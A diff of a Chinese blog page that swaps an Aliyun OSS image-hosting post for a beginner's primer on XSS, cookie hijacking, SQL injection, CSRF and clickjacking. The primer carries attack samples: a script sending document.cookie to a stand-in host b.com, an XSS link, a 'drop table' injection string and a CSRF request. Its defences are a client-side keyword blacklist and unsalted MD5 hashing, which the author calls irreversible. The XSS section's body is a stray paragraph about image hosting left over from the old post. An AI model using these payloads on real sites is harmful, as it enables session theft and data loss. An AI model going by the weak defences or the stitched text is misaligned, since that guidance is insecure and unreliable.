@@ -75,7 +75,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="hexo,optimization,image," />
+  <meta name="keywords" content="JS,HTML,Web Security," />
 
 
 
@@ -91,26 +91,19 @@
 
 
 
-<meta name="description" content="前言之前打算写一篇有关个人博客SEO优化的体验和一些自身体会，但是发现自己还没完全理解SEO的一些核心知识和原理，所以就等到以后再来写，毕竟我的百度权值还是0（笑…）。接下来讲解一下博客中用的图床——阿里云对象存储（Object Storage Service，简称OSS），虽然目前大家用的比较多的是七牛云之类的，但是因为我个人原因我还是选择了阿里云，后面我会简单说明下原因。">
+<meta name="description" content="前言之前忙于做各种事情，已经很久没写过文章，最近接的一个学校的网站项目，近期被人用自动脚本攻破了（笑…），因为我们第一次做这种上线的项目，完全没有意识到一些web安全的知识，所以就开始了紧急的漏洞补救和防护措施。所以我就把近期学习的知识总结下。目前我水平有限，只能做一个初级认识，让一些刚入行做上线的实际项目的同学能有所警惕。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="解决博客图片存储——阿里云的OSS运用">
-<meta property="og:url" content="http://www.cduyzh.com/img-oss/index.html">
+<meta property="og:title" content="Web安全——前端JS表单验证过滤">
+<meta property="og:url" content="http://www.cduyzh.com/js-validate-code/index.html">
 <meta property="og:site_name" content="Water Sister's Blog">
-<meta property="og:description" content="前言之前打算写一篇有关个人博客SEO优化的体验和一些自身体会，但是发现自己还没完全理解SEO的一些核心知识和原理，所以就等到以后再来写，毕竟我的百度权值还是0（笑…）。接下来讲解一下博客中用的图床——阿里云对象存储（Object Storage Service，简称OSS），虽然目前大家用的比较多的是七牛云之类的，但是因为我个人原因我还是选择了阿里云，后面我会简单说明下原因。">
-<meta property="og:image" content="http://img.cduyzh.com/images/aliyun-img.jpg">
-<meta property="og:image" content="http://img.cduyzh.com/images/aliyun-oss1.png">
-<meta property="og:image" content="http://img.cduyzh.com/images/aliyun-oss2.png">
-<meta property="og:image" content="http://img.cduyzh.com/images/aliyun-oss3.png">
-<meta property="og:image" content="http://img.cduyzh.com/images/aliyun-oss4.png">
-<meta property="og:image" content="http://img.cduyzh.com/images/aliyun-oss6.png">
-<meta property="og:image" content="http://img.cduyzh.com/images/aliyun-oss7.png">
-<meta property="og:image" content="http://img.cduyzh.com/images/aliyun-oss8.png">
-<meta property="og:image" content="http://img.cduyzh.com/images/aliyun-oss9.png">
-<meta property="og:updated_time" content="2017-03-26T15:06:12.223Z">
+<meta property="og:description" content="前言之前忙于做各种事情，已经很久没写过文章，最近接的一个学校的网站项目，近期被人用自动脚本攻破了（笑…），因为我们第一次做这种上线的项目，完全没有意识到一些web安全的知识，所以就开始了紧急的漏洞补救和防护措施。所以我就把近期学习的知识总结下。目前我水平有限，只能做一个初级认识，让一些刚入行做上线的实际项目的同学能有所警惕。">
+<meta property="og:image" content="http://img.cduyzh.com/images/js.jpg">
+<meta property="og:image" content="http://img.cduyzh.com/images/12306.jpg">
+<meta property="og:updated_time" content="2017-04-08T06:07:10.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="解决博客图片存储——阿里云的OSS运用">
-<meta name="twitter:description" content="前言之前打算写一篇有关个人博客SEO优化的体验和一些自身体会，但是发现自己还没完全理解SEO的一些核心知识和原理，所以就等到以后再来写，毕竟我的百度权值还是0（笑…）。接下来讲解一下博客中用的图床——阿里云对象存储（Object Storage Service，简称OSS），虽然目前大家用的比较多的是七牛云之类的，但是因为我个人原因我还是选择了阿里云，后面我会简单说明下原因。">
-<meta name="twitter:image" content="http://img.cduyzh.com/images/aliyun-img.jpg">
+<meta name="twitter:title" content="Web安全——前端JS表单验证过滤">
+<meta name="twitter:description" content="前言之前忙于做各种事情，已经很久没写过文章，最近接的一个学校的网站项目，近期被人用自动脚本攻破了（笑…），因为我们第一次做这种上线的项目，完全没有意识到一些web安全的知识，所以就开始了紧急的漏洞补救和防护措施。所以我就把近期学习的知识总结下。目前我水平有限，只能做一个初级认识，让一些刚入行做上线的实际项目的同学能有所警惕。">
+<meta name="twitter:image" content="http://img.cduyzh.com/images/js.jpg">
 
 
 
@@ -152,12 +145,12 @@
 </script>
 
 
-  <link rel="canonical" href="http://www.cduyzh.com/img-oss/"/>
+  <link rel="canonical" href="http://www.cduyzh.com/js-validate-code/"/>
 
 
 
 
-  <title> 解决博客图片存储——阿里云的OSS运用 | Water Sister's Blog </title>
+  <title> Web安全——前端JS表单验证过滤 | Water Sister's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -344,7 +337,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://www.cduyzh.com/img-oss/">
+    <link itemprop="mainEntityOfPage" href="http://www.cduyzh.com/js-validate-code/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Yang ZiHao">
@@ -365,7 +358,7 @@
             
             
               
-                解决博客图片存储——阿里云的OSS运用
+                Web安全——前端JS表单验证过滤
               
             
           </h2>
@@ -380,8 +373,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-26T20:51:25+08:00">
-                2017-03-26
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-08T13:58:10+08:00">
+                2017-04-08
               </time>
             
 
@@ -421,7 +414,7 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a class="cloud-tie-join-count" href="/img-oss/#comments" itemprop="discussionUrl">
+                <a class="cloud-tie-join-count" href="/js-validate-code/#comments" itemprop="discussionUrl">
                   <span class="post-comments-count join-count" itemprop="commentCount"></span>
                 </a>
               </span>
@@ -430,7 +423,7 @@
 
           
           
-             <span id="/img-oss/" class="leancloud_visitors" data-flag-title="解决博客图片存储——阿里云的OSS运用">
+             <span id="/js-validate-code/" class="leancloud_visitors" data-flag-title="Web安全——前端JS表单验证过滤">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -455,7 +448,7 @@
                     <span class="post-meta-item-text">字数统计</span>
                   
                     <span title="字数统计" }}">
-                      1,798 字
+                      3,391 字
                     </span>
               
 
@@ -471,7 +464,7 @@
                     <span class="post-meta-item-text">阅读时长</span>
                   
                     <span title="阅读时长" }}">
-                      6 分钟
+                      12 分钟
                     </span>
               
             </div>
@@ -490,28 +483,105 @@
       
 
       
-        <p><img src="http://img.cduyzh.com/images/aliyun-img.jpg" alt="阿里云-OSS运用"></p>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前打算写一篇有关个人博客SEO优化的体验和一些自身体会，但是发现自己还没完全理解SEO的一些核心知识和原理，所以就等到以后再来写，毕竟我的百度权值还是0（笑…）。接下来讲解一下博客中用的图床——阿里云对象存储（Object Storage Service，简称OSS），虽然目前大家用的比较多的是七牛云之类的，但是因为我个人原因我还是选择了阿里云，后面我会简单说明下原因。<br><a id="more"></a></p>
-<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><h3 id="github-pages容量受限"><a href="#github-pages容量受限" class="headerlink" title="github pages容量受限"></a>github pages容量受限</h3><p>之前看过一些别人的github博客，发现只要文章多的人，基本上都用到了图床，原因有很多，毕竟github免费给你用，肯定会限制你的可使用空间的，从长远来看，你的图片资源肯定不能放到别人服务器上，大家还是要理解下。</p>
-<h3 id="图床访问速度快"><a href="#图床访问速度快" class="headerlink" title="图床访问速度快"></a>图床访问速度快</h3><p>一般用图床的，都是图片之类的静态文件非常多，把图片存储到第三方CDN，除了加快图片访问速速，还可以降低你服务器的存储压力，后续网站迁移扩容就不受影响了。</p>
-<h3 id="前瞻性"><a href="#前瞻性" class="headerlink" title="前瞻性"></a>前瞻性</h3><p>虽然我们目前做的是一个博客的小网站，但是以后无论是自己的博客还是实际的项目，都可以用图片来提供外链，方便管理，如果你的网站访问量很高啊，一天几十万几百万啊，我的天啊，这时候你考虑的就不是服务器空间够不够大，而是惊人的并发数啊，光是请求html文件（或其他）的链接就处理不过来了，哪还有多余的资源去读取图片啊，索性就把图片存另一个服务器吧，给主服务器减轻压力啊，于是图床诞生了。</p>
-<h3 id="个人原因"><a href="#个人原因" class="headerlink" title="个人原因"></a>个人原因</h3><p>本人在阿里云的外网上买了几个域名，索性就用了他们的产品，毕竟平时支付宝用的多吧，我看了一下阿里云的OSS服务，虽然性价比比不上七牛云，但是我个人来说就够用了。</p>
-<h2 id="对比分析"><a href="#对比分析" class="headerlink" title="对比分析"></a>对比分析</h2><h3 id="存储空间费用"><a href="#存储空间费用" class="headerlink" title="存储空间费用"></a>存储空间费用</h3><p><strong>阿里云</strong> ： 0-5GB(含)部分     免费 <strong>只限香港地区</strong><br><strong>七牛云</strong> ： 0 GB 至 10 GB      免费</p>
-<h3 id="流量费用"><a href="#流量费用" class="headerlink" title="流量费用"></a>流量费用</h3><p><strong>阿里云</strong> ：0-5GB(含)部分     免费<br><strong>七牛云</strong> ：<br>HTTP 下载流量     第 0 GB 至 10 GB     国内免费  国外免费<br>HTTPS 下载流量     第 0 GB 至 10 TB (含)     0.36 元/GB     0.58 元/GB<br>暂且可以不用考虑这个HTTPS流量，因为我博客基本都用到的是HTTP下载流量）</p>
-<hr>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>所以就很尴尬，我居然会选择阿里云来做我的图床（我今年3月10日才正式上限，3月完已经跑了我6G多的流出带宽，为此我自己还交了几块钱，虽然不多，但是交的心甘情愿吧，毕竟阿里爸爸这个大公司，不会让我上传的图片出现一些问题，安全和速度绝对有保障）<br>最尴尬的是：存储容量居然目前用了不到5M（如果不传一些视频的话，全是压缩后的图片的话，一般占用不到多少，而且我也不敢放视频上去做外链，这样我的带宽按目前情况要上百G）。<br>后面给大家分享一个压缩图片的网站，之前的我很天真，想着刚开博客，跑不了多少流量出去，直到5G用完那一刻，我才意识到压缩图片的重要性。</p>
-<h2 id="使用OSS"><a href="#使用OSS" class="headerlink" title="使用OSS"></a>使用OSS</h2><p>这里我拿的阿里云OSS来讲，基本上每个地方的都类似。</p>
-<h3 id="进入控制台"><a href="#进入控制台" class="headerlink" title="进入控制台"></a>进入控制台</h3><p><img src="http://img.cduyzh.com/images/aliyun-oss1.png" alt="阿里云-OSS运用"><br>选择对象存储OSS进入到对应面板<br><img src="http://img.cduyzh.com/images/aliyun-oss2.png" alt="阿里云-OSS运用"><br>新建一个Bucket<br><strong>注意：</strong>我是用的阿里云，如果要跟我用一样的话，所属区域要选香港。不然可能产生格外的其他费用。<br><img src="http://img.cduyzh.com/images/aliyun-oss3.png" alt="阿里云-OSS运用"><br>创建完Bucket对象后，就可以上传本地需要存储文件<br><img src="http://img.cduyzh.com/images/aliyun-oss4.png" alt="阿里云-OSS运用"><br>然后就可以获取这个图片的地址，复制后在浏览器里输入试试能不能正常显示</p>
-<h2 id="图片链接地址优化"><a href="#图片链接地址优化" class="headerlink" title="图片链接地址优化"></a>图片链接地址优化</h2><p>其实这个也没什么，但是一些图片的外链和title好像是会提高搜索引擎的蜘蛛爬取。<br>比如在用MD写文章的时候引入图片的title最好这样</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">![阿里云-OSS运用](http://img.cduyzh.com/images/aliyun-oss5.png)</div></pre></td></tr></table></figure>
-<p>细心的人可能会发现我的图片地址很简洁，这样就会让百度和其他搜索引擎的蜘蛛更快的来爬去你的图片进而检录上去。<br><img src="http://img.cduyzh.com/images/aliyun-oss6.png" alt="阿里云-OSS运用"><br><img src="http://img.cduyzh.com/images/aliyun-oss7.png" alt="阿里云-OSS运用"><br>要把图片地址改为这样的要如何来实现，其实不难。把它的地址解析到你想要的地址上，前提要先去域名解析那设置好，如果用的阿里云还可以自动设置。<br><img src="http://img.cduyzh.com/images/aliyun-oss8.png" alt="阿里云-OSS运用"><br>然后查看我自己控制台的cduyzh.com这个域名，在域名解析那我发现多了个这个，当然你也可以自己来设置的。<br><img src="http://img.cduyzh.com/images/aliyun-oss9.png" alt="阿里云-OSS运用"><br>这样后在你添加图片后，你就可以把前面那一长段换成自己想要的域名地址链接，无论是他人下载你的图片，或者搜索引擎来检索你的图片，都会方便许多。</p>
-<h2 id="图片在线压缩网站"><a href="#图片在线压缩网站" class="headerlink" title="图片在线压缩网站"></a>图片在线压缩网站</h2><p>地址：<a href="https://tinyjpg.com/" target="_blank" rel="external">图片在线压缩网站</a><br>这个网站基本上会把你的照片压缩50%以上，所以很好用。但是一次最多上传20张，最大5MB封底，如果比较多或者大的照片，只能分批次来处理压缩了。</p>
-<h2 id="OSS管理工具"><a href="#OSS管理工具" class="headerlink" title="OSS管理工具"></a>OSS管理工具</h2><p><a href="http://gosspublic.alicdn.com/oss-client-aliyun-v1.1.9.0-win.zip?spm=5176.2020520105.113.2.1f1Z3T&amp;file=oss-client-aliyun-v1.1.9.0-win.zip" target="_blank" rel="external">OSS管理工具</a><br>这个软件是阿里云官方给的OSS管理工具，如果嫌每次上网页上传麻烦，可以试试这个。</p>
+        <p><img src="http://img.cduyzh.com/images/js.jpg" alt="前端JS表单验证过滤"></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前忙于做各种事情，已经很久没写过文章，最近接的一个学校的网站项目，近期被人用自动脚本攻破了（笑…），因为我们第一次做这种上线的项目，完全没有意识到一些web安全的知识，所以就开始了紧急的漏洞补救和防护措施。所以我就把近期学习的知识总结下。目前我水平有限，只能做一个初级认识，让一些刚入行做上线的实际项目的同学能有所警惕。<br><a id="more"></a></p>
+<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><h3 id="安全小白"><a href="#安全小白" class="headerlink" title="安全小白"></a>安全小白</h3><p>作为这个网站项目组长，我是完全不知道这些安全隐患问题的，团队的人员也没有研究过这些，所以造成了这个情况，因为我们是在校大学学生，确实学无余力来研究这些，希望对还未出社会的初学者提个醒。</p>
+<h2 id="web常见攻击手段"><a href="#web常见攻击手段" class="headerlink" title="web常见攻击手段"></a>web常见攻击手段</h2><p>我只会大概提及它的攻击原理和预防方法，具体的实现和深入研究还请大家自行百度，因为只有真正需要用到才会去详细了解，这里我只为web安全小白做知识扫盲。因为博主目前接触最多的服务端语言是JAVA所以例子都从java web项目来讲。</p>
+<h3 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h3><p>虽然我们目前做的是一个博客的小网站，但是以后无论是自己的博客还是实际的项目，都可以用图片来提供外链，方便管理，如果你的网站访问量很高啊，一天几十万几百万啊，我的天啊，这时候你考虑的就不是服务器空间够不够大，而是惊人的并发数啊，光是请求html文件（或其他）的链接就处理不过来了，哪还有多余的资源去读取图片啊，索性就把图片存另一个服务器吧，给主服务器减轻压力啊，于是图床诞生了。</p>
+<ol>
+<li>反射型XSS</li>
+</ol>
+<p>它是通过诱使用户打开一个恶意链接，服务端将链接中参数的恶意代码渲染到页面中，再传递给用户由浏览器执行，从而达到攻击的目的。如下面的链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://a.com/a.jsp?name=xss&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>a.jsp将页面渲染成下面的html：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hello xss&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>这时浏览器将会弹出提示框。</p>
 <blockquote>
-<p>如果照片名字重复上传，会自动覆盖掉上一次已经上传的，保留最后一次上传的。</p>
+<p>这算是常见的一种方法，预防的话可以通过后台编写方法来拦截过滤到这些非法或有攻击性的字符。</p>
 </blockquote>
-<p>这个功能可以说比较实用，因为有些时候，你会忘记去压缩图片，然后你文章什么的都发了，不可能把以前的删了重新上传，这样把上传的图片下载下来再去压缩，最后直接丢进来覆盖上传很省事。<br>因为我自己每次上传文章后，把文章用到的一些图片丢到云后，我本地要清空了，节约一些磁盘空间（大部分图片为手动截图的）。</p>
-<h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2><p>虽然一个博客用到图床还不能体会到图床的一些强大之处，但是越往后就会越深入，做一些网站可能用到的静态过多后，可能会考虑用图床来解决服务器存储容量问题，以及一个网站日均访问量很大，图片的GET次数很大的时候，可以用图床来缓解请求压力，不至于影响用户体验。希望大家能了解到可以用图床来处理一些静态文件的加载。</p>
+<ol>
+<li>持久型XSS</li>
+</ol>
+<p>持久型XSS将恶意代码提交给服务器，并且存储在服务器端，当用户访问相关内容时再渲染到页面中，以达到攻击的目的，它的危害更大。</p>
+<p>比如，攻击者写了一篇带恶意JS代码的博客，文章发表后，所有访问该博客文章的用户都会执行这段恶意JS。</p>
+<blockquote>
+<p>这个相对来说对我们开发网站来说不算重要，但是要小心攻击者在你网站注入一些非法代码，从而达到这个目的。</p>
+<h3 id="Cookie劫持"><a href="#Cookie劫持" class="headerlink" title="Cookie劫持"></a>Cookie劫持</h3></blockquote>
+<p>Cookie中一般保存了当前用户的登录凭证，如果可以得到，往往意味着可直接进入用户帐户，而Cookie劫持也是最常见的XSS攻击。以上面提过的反射型XSS的例子来说，可以像下面这样操作：</p>
+<p>首先诱使用户打开下面的链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://a.com/a.jsp?name=xss&lt;script src=http://b.com/b.js&gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>用户打开链接后，会加载b.js，并执行b.js中的代码。b.js中存储了以下JS代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var img = document.createElement(&quot;img&quot;);</div><div class="line">img.src = &quot;http://b.com/log?&quot; + escape(document.cookie);</div><div class="line">document.body.appendChild(img);</div></pre></td></tr></table></figure>
+<p>上面的代码会向b.com请求一张图片，但实际上是将当前页面的cookie发到了b.com的服务器上。这样就完成了窃取cookie的过程。</p>
+<p>防御Cookie劫持的一个简单的方法是在Set-Cookie时加上HttpOnly标识，浏览器禁止JavaScript访问带HttpOnly属性的Cookie。</p>
+<h2 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h2><ol>
+<li>输入检查<br>对输入数据做检查，比如用户名只允许是字母和数字，邮箱必须是指定格式。<br>一定要在后台做检查，否则数据可能绕过前端检查直接发给服务器。<br>一般前后端都做检查，这样前端可以挡掉大部分无效数据。<br>对特殊字符做编码或过滤，但因为不知道输出时的语境，所以可能会做不适当的过滤，最好是在输出时具体情况具体处理。</li>
+<li>输出检查<br>对渲染到HTML中内容执行HtmlEncode，对渲染到JavaScript中的内容执行JavascriptEncode。<br>另外还可以使用一些做XSS检查的开源项目。<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2>SQL注入常常会听到，它与XSS类似，是由于用户提交的数据被当成命令来执行而造成的。下面是一个SQL注入的例子：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">String sql = &quot;select * from user where username = &apos;&quot; + username + &quot;&apos;&quot;;</div></pre></td></tr></table></figure>
+<p>像上面的SQL语句，如果用户提交的username参数是leo，则数据库执行的SQL为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from user where username = &apos;leo&apos;</div></pre></td></tr></table></figure>
+<p>但如果用户提交的username参数是leo’; drop table user–，那执行的SQL为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from user where username = &apos;leo&apos;; drop table user--&apos;</div></pre></td></tr></table></figure>
+<p>在查询数据后，又执行了一个删除表的操作，这样的后果非常严重。</p>
+<blockquote>
+<p>博主本人的网站就是主要被SQL注入导致网站数据库受损</p>
+</blockquote>
+<h2 id="SQL注入的防御"><a href="#SQL注入的防御" class="headerlink" title="SQL注入的防御"></a>SQL注入的防御</h2><p>防止SQL注入最好的方法是使用预编译语句，如下面所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">String sql = &quot;select * from user where username = ?&quot;;</div><div class="line">PreparedStatement pstmt = conn.prepareStatement(sql);</div><div class="line">pstmt.setString(1, username);</div><div class="line">ResultSet results = pstmt.executeQuery();</div></pre></td></tr></table></figure>
+<p>不同语言的预编译方法不同，但基本都可以处理。</p>
+<p>如果遇到无法使用预编译方法时，只能像防止XSS那样对参数进行检查和编码。</p>
+<blockquote>
+<p>博主后面会贴出自己完善项目的检测代码，就是对网站可以进行数据提交的表单的输入进行SQL语句检测。</p>
+</blockquote>
+<h2 id="跨站请求伪造（CSRF）"><a href="#跨站请求伪造（CSRF）" class="headerlink" title="跨站请求伪造（CSRF）"></a>跨站请求伪造（CSRF）</h2><p>跨站请求伪造的英文全称是Cross Site Request Forgery，是由于操作所需的所有参数都能被攻击者得到，进而构造出一个伪造的请求，在用户不知情的情况下被执行。看下面一个例子：</p>
+<p>如果a.com网站需要用户登录后可以删除博客，删除博客的请求地址如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET http://a.com/blog/delete?id=1</div></pre></td></tr></table></figure>
+<p>当用户登录a.com后，又打开了<a href="http://b.com/b.html，其中有下面的内容：" target="_blank" rel="external">http://b.com/b.html，其中有下面的内容：</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;http://a.com/blog/delete?id=1&quot;/&gt;</div></pre></td></tr></table></figure>
+<p>这时会以用户在a.com的身份发送<a href="http://a.com/blog/delete?id=1，删除那篇博客。" target="_blank" rel="external">http://a.com/blog/delete?id=1，删除那篇博客。</a></p>
+<h2 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a>CSRF的防御</h2><ol>
+<li>验证码</li>
+</ol>
+<p>CSRF是在用户不知情的情况下构造的网络情况，验证码则强制用户与应用交互，所以验证码可以很好得防止CSRF。但不能什么请求都加验证码。</p>
+<ol>
+<li>referer检查</li>
+</ol>
+<p>检查请求header中的referer也能帮助防止CSRF攻击，但服务器不是总能拿到referer，浏览器可能出于安全或隐私而不发送referer，所以也不常用。倒是图片防盗链中用得很多。</p>
+<ol>
+<li>Anti CSRF Token</li>
+</ol>
+<p>更多的是生成一个随机的token，在用户提交数据的同时提交这个token，服务器端比对后如果不正确，则拒绝执行操作。</p>
+<blockquote>
+<p>作为了解，一般前面的攻击都过了，就可以造成此类攻击。</p>
+<h2 id="点击劫持（ClickJacking）"><a href="#点击劫持（ClickJacking）" class="headerlink" title="点击劫持（ClickJacking）"></a>点击劫持（ClickJacking）</h2></blockquote>
+<p>点击劫持是从视觉上欺骗用户。攻击者使用一个透明的iframe覆盖在一个网页上，诱使用户在该网页上操作，而实际点击却是点在透明的iframe页面。</p>
+<p>点击劫持延伸出了很多攻击方式，有图片覆盖攻击、拖拽劫持等。<br>点击劫持的防御</p>
+<p>针对iframe的攻击，可使用一个HTTP头：X-Frame-Options，它有三种可选值：</p>
+<pre><code>DENY： 禁止任何页面的frame加载；
+SAMEORIGIN：只有同源页面的frame可加载；
+ALLOW-FROM：可定义允许frame加载的页面地址。
+</code></pre><p>针对图片覆盖攻击，则注意使用预防XSS的方法，防止HTML和JS注入。</p>
+<blockquote>
+<p>作为了解，一般前面的攻击都过了，就可以造成此类攻击。</p>
+</blockquote>
+<h2 id="我的方法"><a href="#我的方法" class="headerlink" title="我的方法"></a>我的方法</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>我们负责的团队项目为学校网站制作，所以涉及到用户输入的地方都在后台管理模块，从后台登录界面开始就应该做一些防护措施了。</p>
+<h3 id="登录的字符检测"><a href="#登录的字符检测" class="headerlink" title="登录的字符检测"></a>登录的字符检测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">function validate(value) &#123;</div><div class="line">    var pattern = /[`~!@#$%^&amp;*()_+&lt;&gt;?:&quot;&#123;&#125;,.\/;&apos;[\]]/im;</div><div class="line">    if (value === &apos;&apos; || value === null) return false;</div><div class="line">    if (pattern.test(value)) &#123;</div><div class="line">        alert(&quot;非法字符！&quot;);</div><div class="line">        return false;</div><div class="line">    &#125;</div><div class="line">    return true;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function filterSqlStr(value) &#123;</div><div class="line">    var str = &quot;and,delete,or,exec,insert,select,union,update,count,*,&apos;,join,&gt;,&lt;&quot;;</div><div class="line">    var sqlStr = str.split(&apos;,&apos;);</div><div class="line">    var flag = true;</div><div class="line">    </div><div class="line">    for (var i = 0; i &lt; sqlStr.length; i++) &#123;</div><div class="line">        if (value.toLowerCase().indexOf(sqlStr[i]) != -1) &#123;</div><div class="line">            flag = false;</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    alert(flag);</div><div class="line">    return flag;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>JS封装的2个方法，用于返回布尔值来判断是否通过。第一个为了过滤掉非法字符，第二个为了过滤有关数据库操作的非法字符。</p>
+</blockquote>
+<h3 id="密码MD5加密"><a href="#密码MD5加密" class="headerlink" title="密码MD5加密"></a>密码MD5加密</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">//password  Md5</div><div class="line">	</div><div class="line">	    public static String MD5Password(String oldstr) &#123;</div><div class="line">	 </div><div class="line">	        char hexDigits[] = &#123; &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;,</div><div class="line">	                &apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos; &#125;;</div><div class="line">	 </div><div class="line">	        byte[] oldbytes = oldstr.getBytes();</div><div class="line">	        </div><div class="line">	        try &#123;</div><div class="line">	        	</div><div class="line">	            MessageDigest md = MessageDigest.getInstance(&quot;MD5&quot;);// 获取对象</div><div class="line">	            </div><div class="line">	            md.update(oldbytes);// 初始化对象</div><div class="line">	            </div><div class="line">	            byte[] newBytes = md.digest();// 运行加密算法</div><div class="line">	            </div><div class="line">	            char[] newStr = new char[32];</div><div class="line">	            </div><div class="line">	            for (int i = 0; i &lt; 16; i++) &#123;</div><div class="line">	            	</div><div class="line">	                byte temp = newBytes[i];</div><div class="line">	                </div><div class="line">	                newStr[2 * i] = hexDigits[temp &gt;&gt;&gt; 4 &amp; 0xf];</div><div class="line">	                </div><div class="line">	                newStr[2 * i + 1] = hexDigits[temp &amp; 0xf];</div><div class="line">	                </div><div class="line">	            &#125;</div><div class="line">	            </div><div class="line">	            return new String(newStr);</div><div class="line">	            </div><div class="line">	        &#125; catch (NoSuchAlgorithmException e) &#123;</div><div class="line">	        	</div><div class="line">	            return null;</div><div class="line">	            </div><div class="line">	        &#125;</div><div class="line">	 </div><div class="line">	    &#125;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>通过在后台对数据库中，管理员的密码进行MD5加密然后存入加密后的字段进去，在前台通过加密前的字段输入后在后台进行方法验证，实现MD5加密登录。防止数据库的密码被暴露查询出来。加密后无法被反解密出来。</p>
+</blockquote>
+<h3 id="后台添加修改信息的字符检测"><a href="#后台添加修改信息的字符检测" class="headerlink" title="后台添加修改信息的字符检测"></a>后台添加修改信息的字符检测</h3><p>同前台登录一样的检测方法，因为我只负责前台检测，如果黑客绕过了我的检测，就要进行后台对数据传过去的值进行检测，这时候就是后台人员的工作了。所以前后台都要进行这些字符检测，但是后台的责任要重一点，因为数据最终流向是在后台服务器端，前台只是初步防护而已。</p>
